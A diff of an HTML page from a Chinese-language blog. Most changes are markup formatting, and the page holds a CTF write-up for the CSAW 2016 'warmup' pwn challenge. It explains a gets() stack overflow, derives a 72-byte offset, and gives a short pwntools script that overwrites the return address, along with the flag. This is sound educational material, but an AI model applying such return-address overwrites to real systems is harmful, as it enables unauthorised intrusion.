@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html  lang="zh">
-<head>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
 <title>CSAW CTF 2016 PWN warmup - Hvnt3r&#39;s Blog</title>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
 
@@ -100,20 +100,15 @@
             
             <div class="navbar-start">
                 
-                <a class="navbar-item"
-                href="/">主页</a>
+                <a class="navbar-item" href="/">主页</a>
                 
-                <a class="navbar-item"
-                href="/archives/">归档</a>
+                <a class="navbar-item" href="/archives/">归档</a>
                 
-                <a class="navbar-item"
-                href="/categories/">分类</a>
+                <a class="navbar-item" href="/categories/">分类</a>
                 
-                <a class="navbar-item"
-                href="/tags/">标签</a>
+                <a class="navbar-item" href="/tags/">标签</a>
                 
-                <a class="navbar-item"
-                href="/about/">关于我</a>
+                <a class="navbar-item" href="/about/">关于我</a>
                 
             </div>
             
@@ -178,14 +173,14 @@
             <p>先对文件有个大致的了解，是64位ELF文件</p>
 <figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">☁  csaw ctf 2016 quals-warmup  ls</span><br><span class="line">exp.py  flag.txt  readme.txt  warmup</span><br><span class="line">☁  csaw ctf 2016 quals-warmup  file warmup </span><br><span class="line">warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</span><br><span class="line">☁  csaw ctf 2016 quals-warmup  chmod +x warmup </span><br><span class="line">☁  csaw ctf 2016 quals-warmup  ./warmup </span><br><span class="line">-Warm Up-</span><br><span class="line">WOW:0x40060d</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<p><img src="https://i.loli.net/2018/10/08/5bbab4f87f3ce.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/08/5bbab4f87f3ce.png" alt></p>
 <p>这个程序没有开启任何的保护，而且文件是动态链接却没有给出<code>libc</code></p>
 <p>丢进IDA看一下：</p>
-<p><img src="https://i.loli.net/2018/10/08/5bbab66d032b5.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/08/5bbab66d032b5.png" alt></p>
 <p>看到了熟悉的<code>gets()</code>函数，通常一看到这个函数就八成有缓冲区溢出漏洞，可以看出程序为<code>v5</code>开辟了<code>40H</code>的存储空间，所以输入长度超过<code>40H</code>即可造成溢出，再看<code>sprint()</code>函数</p>
-<p><img src="https://i.loli.net/2018/10/08/5bbac8c7057d8.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/08/5bbac8c7057d8.png" alt></p>
 <p>进入<code>sub_40060D</code>中看一下：</p>
-<p><img src="https://i.loli.net/2018/10/08/5bbac902052df.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/08/5bbac902052df.png" alt></p>
 <p>可以看到这个函数是获取flag的关键点，程序会打印出此函数的位置，即<code>0x40060d</code>，到这里思路就差不多明了了，我们需要控制溢出位置，把返回地址改为此函数的地址，我们当前函数的返回值位于<code>RBP+8</code>的位置，因此溢出点可以通过计算得出：<code>40H+8H=48H=72</code>，因此python脚本如下</p>
 <figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="hljs-string">'192.168.229.128'</span>, <span class="hljs-number">10001</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="hljs-string">'WOW:'</span>)</span><br><span class="line">address = r.recvuntil(<span class="hljs-string">'\n'</span>)[:<span class="hljs-number">-1</span>]</span><br><span class="line">payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">72</span> + p64(int(address, <span class="hljs-number">16</span>))</span><br><span class="line"></span><br><span class="line">r.writeline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>即可获取flag:<code>FLAG{LET_US_BEGIN_CSAW_2016}</code></p>
@@ -361,36 +356,31 @@
         
         <div class="level is-mobile">
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Github" href="https://github.com/Hvnt3r">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Github" href="https://github.com/Hvnt3r">
                 
                 <i class="fab fa-github"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Facebook" href="https://facebook.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Facebook" href="https://facebook.com">
                 
                 <i class="fab fa-facebook"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Twitter" href="https://twitter.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Twitter" href="https://twitter.com">
                 
                 <i class="fab fa-twitter"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Dribbble" href="https://dribbble.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Dribbble" href="https://dribbble.com">
                 
                 <i class="fab fa-dribbble"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="RSS" href="https://hvnt3r.top/atom.xml">
+            <a class="level-item button is-white is-marginless" target="_blank" title="RSS" href="https://hvnt3r.top/atom.xml">
                 
                 <i class="fas fa-rss"></i>
                 
@@ -2295,8 +2285,7 @@
                 </a>
                 <p class="is-size-7">
                 &copy; 2019 Hvnt3r&nbsp;
-                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
-                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
                 
                 </p>
             </div>
@@ -2432,7 +2421,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么...">
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -2459,5 +2448,5 @@ document.addEventListener('DOMContentLoaded', function () {
 <link rel="stylesheet" href="/css/search.css">
 <link rel="stylesheet" href="/css/insight.css">
     
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-koharu"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
